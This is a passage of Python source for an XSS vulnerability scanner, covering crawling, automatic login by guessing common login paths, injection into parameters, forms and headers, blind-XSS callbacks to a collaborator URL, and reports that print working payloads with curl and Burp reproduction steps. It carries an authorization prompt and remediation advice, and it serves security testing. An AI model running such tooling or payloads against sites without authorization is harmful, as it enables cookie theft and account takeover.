        parsed = urllib.parse.urlparse(url)
        path   = parsed.path or "/"
        if parsed.query:
            path += "?" + parsed.query
        host   = parsed.netloc

        lines = [f"{method} {path} HTTP/1.1", f"Host: {host}"]
        if headers:
            for k, v in headers.items():
                lines.append(f"{k}: {v}")
        lines.append("User-Agent: Mozilla/5.0 (Security Scanner)")
        lines.append("Accept: */*")

        if method == "POST" and data:
            body = urllib.parse.urlencode(data)
            lines.append(f"Content-Type: application/x-www-form-urlencoded")
            lines.append(f"Content-Length: {len(body)}")
            lines.append("")
            lines.append(body)
        else:
            lines.append("")

        return "\n".join(lines)


# ─────────────────────────────────────────────────────────────────────────────
#  LOGGER / PRINTER
# ─────────────────────────────────────────────────────────────────────────────

class Logger:
    def __init__(self, verbose: bool = False, outfile: str = None):
        self.verbose = verbose
        self.outfile = outfile
        self._log_lines = []

    def _print(self, msg: str, raw: str = ""):
        print(msg)
        if self.outfile:
            self._log_lines.append(raw or re.sub(r'\x1b\[[0-9;]*m', '', msg))

    def info(self, msg):
        self._print(f"{Fore.CYAN}[*]{Style.RESET_ALL} {msg}", f"[*] {msg}")

    def success(self, msg):
        self._print(f"{Fore.GREEN}[+]{Style.RESET_ALL} {msg}", f"[+] {msg}")

    def warn(self, msg):
        self._print(f"{Fore.YELLOW}[!]{Style.RESET_ALL} {msg}", f"[!] {msg}")

    def error(self, msg):
        self._print(f"{Fore.RED}[-]{Style.RESET_ALL} {msg}", f"[-] {msg}")

    def vuln(self, msg):
        self._print(f"{Fore.RED}{Back.YELLOW}[VULN]{Style.RESET_ALL} {msg}",
                    f"[VULN] {msg}")

    def debug(self, msg):
        if self.verbose:
            self._print(f"{Fore.MAGENTA}[DBG]{Style.RESET_ALL} {msg}", f"[DBG] {msg}")

    def progress(self, msg):
        print(f"\r{Fore.BLUE}{msg}{Style.RESET_ALL}", end="", flush=True)

    def section(self, title):
        bar = "═" * 70
        self._print(f"\n{Fore.CYAN}{bar}\n  {title}\n{bar}{Style.RESET_ALL}",
                    f"\n{'='*70}\n  {title}\n{'='*70}")

    def save(self):
        if self.outfile and self._log_lines:
            with open(self.outfile, "w") as f:
                f.write("\n".join(self._log_lines))


# ─────────────────────────────────────────────────────────────────────────────
#  REPORTER
# ─────────────────────────────────────────────────────────────────────────────

class Reporter:
    """Generates detailed, actionable vulnerability reports."""

    @staticmethod
    def print_finding(finding: dict, index: int, logger: Logger):
        logger.section(f"VULNERABILITY #{index}  —  {finding['type']}")

        print(f"\n{Fore.RED}  📍 Location  :{Style.RESET_ALL} {finding['location']}")
        print(f"{Fore.RED}  🌐 URL       :{Style.RESET_ALL} {finding['url']}")
        print(f"{Fore.RED}  📝 Parameter :{Style.RESET_ALL} {finding['param']}")
        print(f"{Fore.RED}  ⚙  Method    :{Style.RESET_ALL} {finding['method']}")
        print(f"{Fore.RED}  🎯 Context   :{Style.RESET_ALL} {finding['context']}")
        print(f"{Fore.RED}  📊 Evidence  :{Style.RESET_ALL} {finding['evidence']}")

        print(f"\n{Fore.YELLOW}  ━━ WORKING PAYLOAD ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Style.RESET_ALL}")
        print(f"{Fore.GREEN}  {finding['payload']}{Style.RESET_ALL}")

        print(f"\n{Fore.YELLOW}  ━━ HTTP REQUEST (Burp-Style) ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Style.RESET_ALL}")
        for line in finding["request"].split("\n"):
            print(f"  {Fore.WHITE}{line}{Style.RESET_ALL}")

        print(f"\n{Fore.YELLOW}  ━━ RESPONSE SNIPPET ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Style.RESET_ALL}")
        snippet = finding.get("response_snippet", "")[:400]
        print(f"  {Fore.CYAN}{snippet}{Style.RESET_ALL}")

        print(f"\n{Fore.YELLOW}  ━━ MANUAL VERIFICATION STEPS ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Style.RESET_ALL}")
        Reporter._print_manual_steps(finding)

    @staticmethod
    def _print_manual_steps(f: dict):
        steps = Reporter._generate_manual_steps(f)
        for i, step in enumerate(steps, 1):
            print(f"  {Fore.WHITE}Step {i}:{Style.RESET_ALL} {step}")

    @staticmethod
    def _generate_manual_steps(f: dict) -> list:
        method  = f["method"]
        url     = f["url"]
        param   = f["param"]
        payload = f["payload"]
        loc     = f["location"]

        base_url = url.split("?")[0]

        steps = [
            f"Open your browser (Chrome/Firefox) and navigate to:\n"
            f"         {Fore.CYAN}{base_url}{Style.RESET_ALL}",
        ]

        if "URL Parameter" in loc or method == "GET":
            encoded = urllib.parse.quote(payload, safe='')
            test_url = f"{base_url}?{param}={encoded}"
            steps += [
                f"Manually navigate to the following URL in your browser:",
                f"         {Fore.GREEN}{test_url}{Style.RESET_ALL}",
                f"Watch for a JavaScript alert dialog box to appear.",
                f"If the alert fires, the XSS is CONFIRMED.",
                f"",
                f"Alternatively, use curl to confirm reflection:",
                f"         {Fore.CYAN}curl -s '{test_url}' | grep -i 'alert'{Style.RESET_ALL}",
                f"",
                f"In Burp Suite:",
                f"  a) Open Burp → Proxy → Intercept",
                f"  b) Visit: {base_url}",
                f"  c) Send the request to Repeater (Ctrl+R)",
                f"  d) Modify {param} parameter value to:\n"
                f"             {Fore.GREEN}{payload}{Style.RESET_ALL}",
                f"  e) Click Send and look for the payload in the Response tab",
            ]

        elif "Form" in loc or method == "POST":
            steps += [
                f"Open the page containing the form: {Fore.CYAN}{base_url}{Style.RESET_ALL}",
                f"Locate the form field named: {Fore.YELLOW}{param}{Style.RESET_ALL}",
                f"Clear the field value and enter the following payload:",
                f"         {Fore.GREEN}{payload}{Style.RESET_ALL}",
                f"Submit the form and watch for an alert dialog.",
                f"",
                f"Using curl (POST):",
                f"         {Fore.CYAN}curl -X POST '{url}' --data '{param}={urllib.parse.quote(payload)}'{Style.RESET_ALL}",
                f"         Then grep the response for the unencoded payload.",
                f"",
                f"In Burp Suite:",
                f"  a) Open Burp → Proxy, visit the page, submit the form",
                f"  b) Intercept the POST request",
                f"  c) Send to Repeater (Ctrl+R)",
                f"  d) In Repeater, change the {param} value to:\n"
                f"             {Fore.GREEN}{payload}{Style.RESET_ALL}",
                f"  e) Click Send — check Response for unencoded payload",
            ]

        elif "Header" in loc:
            steps += [
                f"The injection point is in the HTTP header: {Fore.YELLOW}{param}{Style.RESET_ALL}",
                f"",
                f"Using curl:",
                f"         {Fore.CYAN}curl -H '{param}: {payload}' '{url}'{Style.RESET_ALL}",
                f"",
                f"In Burp Suite:",
                f"  a) Intercept any request to {url}",
                f"  b) Send to Repeater",
                f"  c) Add/modify the header:\n"
                f"             {Fore.YELLOW}{param}: {payload}{Style.RESET_ALL}",
                f"  d) Send and inspect the response",
            ]

        steps += [
            f"",
            f"{Fore.RED}⚠  Impact Assessment:{Style.RESET_ALL}",
            f"  - Session hijacking via document.cookie theft",
            f"  - Credential harvesting / phishing",
            f"  - Defacement / malicious content injection",
            f"  - CSRF token theft / account takeover",
            f"",
            f"{Fore.YELLOW}📋 Remediation:{Style.RESET_ALL}",
            f"  - Encode all user input before rendering in HTML",
            f"  - Use Content-Security-Policy (CSP) headers",
            f"  - Implement HttpOnly and Secure cookie flags",
            f"  - Use a trusted sanitization library (DOMPurify, OWASP Java HTML Sanitizer)",
        ]

        return steps

    @staticmethod
    def save_json(findings: list, path: str):
        clean = []
        for f in findings:
            c = dict(f)
            c.pop("response_snippet", None)  # may have binary chars
            clean.append(c)
        with open(path, "w") as fp:
            json.dump({"timestamp": datetime.utcnow().isoformat(),
                       "total": len(clean), "findings": clean}, fp, indent=2)

    @staticmethod
    def print_summary(findings: list, client: HTTPClient, start_time: float, logger: Logger):
        elapsed = time.time() - start_time
        logger.section("SCAN SUMMARY")

        print(f"\n  {Fore.CYAN}Total Requests  :{Style.RESET_ALL} {client.request_count}")
        print(f"  {Fore.CYAN}Total Responses :{Style.RESET_ALL} {client.response_count}")
        print(f"  {Fore.CYAN}Duration        :{Style.RESET_ALL} {elapsed:.1f}s")
        print(f"  {Fore.CYAN}Vulnerabilities :{Style.RESET_ALL} "
              f"{Fore.RED if findings else Fore.GREEN}{len(findings)}{Style.RESET_ALL}\n")

        if findings:
            by_type = defaultdict(int)
            for f in findings:
                by_type[f["type"]] += 1
            for t, cnt in sorted(by_type.items(), key=lambda x: -x[1]):
                print(f"    {Fore.RED}[{cnt}]{Style.RESET_ALL} {t}")
        else:
            print(f"  {Fore.GREEN}  No XSS vulnerabilities detected.{Style.RESET_ALL}")
            print(f"  {Fore.YELLOW}  Note: A clean scan does not guarantee the site is fully secure.{Style.RESET_ALL}")


# ─────────────────────────────────────────────────────────────────────────────
#  AUTH HANDLER
# ─────────────────────────────────────────────────────────────────────────────

class AuthHandler:
    """Handles form-based login to authenticated targets."""

    def __init__(self, client: HTTPClient, base_url: str):
        self.client   = client
        self.base_url = base_url

    def auto_login(self, username: str, password: str, logger: Logger) -> bool:
        """
        Attempt to auto-detect and submit the login form.
        Returns True if login appears successful.
        """
        logger.info("Attempting auto-login…")

        # Try common login paths
        login_paths = ["/login", "/signin", "/auth", "/account/login",
                       "/user/login", "/admin/login", "/wp-login.php",
                       "/accounts/login", "/session/new", "/log-in"]

        login_url = None
        for path in login_paths:
            url  = self.base_url.rstrip("/") + path
            resp = self.client.get(url)
            if resp and resp.status_code == 200 and self._has_login_form(resp.text):
                login_url = url
                logger.success(f"Login page found: {url}")
                break

        if not login_url:
            # Try the base URL itself
            resp = self.client.get(self.base_url)
            if resp and self._has_login_form(resp.text):
                login_url = self.base_url
            else:
                logger.warn("Could not auto-detect login page.")
                login_url = input(f"{Fore.YELLOW}  Enter login page URL manually: {Style.RESET_ALL}").strip()

        # Parse login form
        resp = self.client.get(login_url)
        if not resp:
            logger.error("Cannot reach login page.")
            return False

        soup   = BeautifulSoup(resp.text, "html.parser")
        form   = self._find_login_form(soup)
        if not form:
            logger.error("No login form found on page.")
            return False

        action = urllib.parse.urljoin(login_url, form.get("action", login_url))
        method = form.get("method", "POST").upper()

        # Build POST data
        data = {}
        for inp in form.find_all(["input", "select", "textarea"]):
            name  = inp.get("name", "")
            value = inp.get("value", "")
            itype = inp.get("type", "text").lower()

            if not name:
                continue
            if itype in ("submit", "button", "reset"):
                continue
            if itype in ("hidden", "submit"):
                data[name] = value
                continue

            # Guess username/password fields
            if re.search(r'user|email|login|name', name, re.I) or itype == "email":
                data[name] = username
            elif re.search(r'pass|pwd|secret', name, re.I) or itype == "password":
                data[name] = password
            else:
                data[name] = value

        logger.info(f"Submitting login form → {action}")
        if method == "POST":
            post_resp = self.client.post(action, data=data)
        else:
            post_resp = self.client.get(action, params=data)

        if not post_resp:
            logger.error("Login request failed.")
            return False

        # Heuristic: check for redirect away from login / presence of logout link
        body_lower = post_resp.text.lower()
        if any(kw in body_lower for kw in ["logout", "sign out", "dashboard",
                                            "welcome", "profile", "account"]):
            logger.success("Login appears successful!")
            return True
        elif any(kw in body_lower for kw in ["invalid", "incorrect", "wrong",
                                              "failed", "error", "try again"]):
            logger.error("Login failed. Check credentials.")
            return False
        else:
            logger.warn("Login result ambiguous — continuing with current session.")
            return True

    def _has_login_form(self, html_text: str) -> bool:
        return bool(re.search(r'type=["\']?password', html_text, re.I))

    def _find_login_form(self, soup: BeautifulSoup):
        for form in soup.find_all("form"):
            if form.find("input", {"type": re.compile("password", re.I)}):
                return form
        return None


# ─────────────────────────────────────────────────────────────────────────────
#  MAIN SCANNER ORCHESTRATOR
# ─────────────────────────────────────────────────────────────────────────────

class XSSScanner:
    def __init__(self, args):
        self.args    = args
        self.logger  = Logger(verbose=args.verbose, outfile=args.output)
        self.client  = HTTPClient(proxy=args.proxy,
                                  timeout=args.timeout,
                                  delay=args.delay)
        self.findings = []

        # Add custom headers/cookies
        if args.headers:
            for h in args.headers:
                if ":" in h:
                    k, v = h.split(":", 1)
                    self.client.add_header(k.strip(), v.strip())

        if args.cookies:
            for c in args.cookies:
                if "=" in c:
                    k, v = c.split("=", 1)
                    self.client.add_cookie(k.strip(), v.strip())

    def run(self):
        print(BANNER)

        # Disclaimer
        print(f"{Fore.RED}{'━'*70}")
        print(f"  ⚠  LEGAL NOTICE: This tool must only be used on systems you own or")
        print(f"  ⚠  have explicit written authorization to test. Unauthorized use is")
        print(f"  ⚠  illegal and may result in criminal prosecution.")
        print(f"{'━'*70}{Style.RESET_ALL}\n")

        confirmed = input(f"{Fore.YELLOW}  Do you have authorization to test {self.args.url}? [yes/no]: {Style.RESET_ALL}").strip().lower()
        if confirmed not in ("yes", "y"):
            print(f"\n{Fore.RED}  Scan aborted. Please obtain authorization first.{Style.RESET_ALL}\n")
            sys.exit(0)

        start_time = time.time()
        target_url = self.args.url
        if not target_url.startswith("http"):
            target_url = "https://" + target_url

        # ── Step 1: Reachability ──────────────────────────────────────────────
        self.logger.section("STEP 1 · Target Reachability")
        resp = self.client.get(target_url)
        if not resp:
            self.logger.error(f"Cannot reach {target_url}. Aborting.")
            sys.exit(1)
        self.logger.success(f"Target is up! Status: {resp.status_code}")

        # ── Step 2: Technology Detection ─────────────────────────────────────
        self.logger.section("STEP 2 · Technology Fingerprinting")
        tech_stack = TechFingerprinter.detect(resp)
        if tech_stack:
            self.logger.success(f"Detected: {', '.join(tech_stack)}")
        else:
            self.logger.warn("No specific technologies detected — using generic payloads.")

        # ── Step 3: Auth ──────────────────────────────────────────────────────
        if self.args.auth or self.args.username:
            self.logger.section("STEP 3 · Authentication")
            username = self.args.username
            password = self.args.password
            if not username:
                username = input(f"{Fore.YELLOW}  Username/Email: {Style.RESET_ALL}").strip()
            if not password:
                import getpass
                password = getpass.getpass(f"{Fore.YELLOW}  Password: {Style.RESET_ALL}")

            auth = AuthHandler(self.client, target_url)
            auth.auto_login(username, password, self.logger)
        else:
            self.logger.info("No auth requested — scanning as unauthenticated user.")

        # ── Step 4: Payload Setup ─────────────────────────────────────────────
        self.logger.section("STEP 4 · Payload Preparation")
        db = PayloadDatabase
        all_payloads = db.get_all_payloads()
        fw_payloads  = db.get_framework_payloads(tech_stack)
        total_payloads = len(list(dict.fromkeys(all_payloads + fw_payloads)))
        self.logger.success(f"Loaded {total_payloads} unique payloads "
                            f"(+{len(fw_payloads)} framework-specific for {tech_stack or ['generic']})")

        if self.args.collaborator:
            blind = db.blind_payloads(self.args.collaborator)
            self.logger.info(f"Blind OOB payloads: {len(blind)} (→ {self.args.collaborator})")

        # ── Step 5: Crawl ─────────────────────────────────────────────────────
        self.logger.section("STEP 5 · Web Crawling")
        crawler = Crawler(self.client, target_url, max_pages=self.args.max_pages)
        crawler.crawl(self.logger)
        print()  # newline after progress

        # If a single URL was given and has params, add it manually
        if "?" in target_url:
            parsed = urllib.parse.urlparse(target_url)
            params = urllib.parse.parse_qs(parsed.query)
            for name in params:
                crawler.url_params.append({"url": target_url, "param": name, "original": ""})

        # ── Step 6: Scan ──────────────────────────────────────────────────────
        finder = VulnerabilityFinder(
            client      = self.client,
            tech_stack  = tech_stack,
            collaborator= self.args.collaborator,
            verbose     = self.args.verbose,
        )

        # URL params
        if crawler.url_params:
            self.logger.section(f"STEP 6a · URL Parameter Injection ({len(crawler.url_params)} params)")
            for i, target in enumerate(crawler.url_params, 1):
                self.logger.info(f"[{i}/{len(crawler.url_params)}] Testing param '{target['param']}' at {target['url'][:60]}")
                results = finder.test_url_param(target, self.logger)
                self.findings.extend(results)

        # Forms
        if crawler.forms:
            self.logger.section(f"STEP 6b · Form Field Injection ({len(crawler.forms)} forms)")
            for i, form in enumerate(crawler.forms, 1):
                self.logger.info(f"[{i}/{len(crawler.forms)}] Form @ {form['action'][:60]} "
                                 f"({form['method']}, {len(form['fields'])} fields)")
                results = finder.test_form(form, self.logger)
                self.findings.extend(results)

        # Headers
        if not self.args.skip_headers:
            self.logger.section("STEP 6c · HTTP Header Injection")
            results = finder.test_headers(target_url, self.logger)
            self.findings.extend(results)

        # Deduplicate findings
        seen = set()
        unique_findings = []
        for f in self.findings:
            key = (f["url"], f["param"], f["payload"][:40])
            if key not in seen:
                seen.add(key)
                unique_findings.append(f)
        self.findings = unique_findings

        # ── Step 7: Report ────────────────────────────────────────────────────
        if self.findings:
            self.logger.section(f"STEP 7 · VULNERABILITY REPORT ({len(self.findings)} found)")
            for i, finding in enumerate(self.findings, 1):
                Reporter.print_finding(finding, i, self.logger)
        else:
            self.logger.section("STEP 7 · VULNERABILITY REPORT")
            self.logger.success("No XSS vulnerabilities detected.")

        # ── Summary ───────────────────────────────────────────────────────────
        Reporter.print_summary(self.findings, self.client, start_time, self.logger)

        # ── Save outputs ──────────────────────────────────────────────────────
        if self.args.json_out:
            Reporter.save_json(self.findings, self.args.json_out)
            self.logger.success(f"JSON report saved → {self.args.json_out}")

        if self.args.output:
            self.logger.save()
            self.logger.success(f"Log saved → {self.args.output}")

        print()


# ─────────────────────────────────────────────────────────────────────────────
#  CLI ARGUMENT PARSER
# ─────────────────────────────────────────────────────────────────────────────

def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="xss-scanner",
        description="Advanced XSS Vulnerability Scanner — for authorized use only",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Basic scan
  python xss_scanner.py -u https://target.com

  # Authenticated scan
  python xss_scanner.py -u https://target.com --auth -U admin -P secret

  # Deep crawl with proxy (Burp Suite)
  python xss_scanner.py -u https://target.com --proxy http://127.0.0.1:8080 --max-pages 200

  # Blind XSS with collaborator
  python xss_scanner.py -u https://target.com --collaborator https://your.burpcollaborator.net

  # Verbose with JSON report
  python xss_scanner.py -u https://target.com -v --json-out report.json

  # Custom cookies/headers
  python xss_scanner.py -u https://target.com -c "session=abc123" -H "X-Api-Key: xyz"
        """)

    p.add_argument("-u", "--url", required=True, help="Target URL (e.g. https://target.com)")
    p.add_argument("-U", "--username", help="Username for authenticated scan")
    p.add_argument("-P", "--password", help="Password for authenticated scan")
    p.add_argument("--auth", action="store_true", help="Prompt for credentials interactively")
    p.add_argument("--proxy", help="HTTP proxy (e.g. http://127.0.0.1:8080 for Burp Suite)")
    p.add_argument("--collaborator", metavar="URL", help="Blind XSS callback URL")
    p.add_argument("--max-pages", type=int, default=100, help="Max pages to crawl (default: 100)")
    p.add_argument("--timeout", type=int, default=15, help="Request timeout in seconds")
    p.add_argument("--delay", type=float, default=0.3, help="Delay between requests (default: 0.3s)")
    p.add_argument("-c", "--cookies", nargs="+", metavar="name=value", help="Cookies to inject")
    p.add_argument("-H", "--headers", nargs="+", metavar="Name:Value", help="Custom HTTP headers")
    p.add_argument("-v", "--verbose", action="store_true", help="Verbose output (show each test)")
    p.add_argument("--skip-headers", action="store_true", help="Skip HTTP header injection tests")
    p.add_argument("-o", "--output", metavar="FILE", help="Save log to file")
    p.add_argument("--json-out", metavar="FILE", help="Save findings as JSON report")

    return p


# ─────────────────────────────────────────────────────────────────────────────
#  ENTRY POINT
# ─────────────────────────────────────────────────────────────────────────────

def main():
    parser = build_parser()
    args   = parser.parse_args()
    scanner = XSSScanner(args)
    scanner.run()


if __name__ == "__main__":
    main()
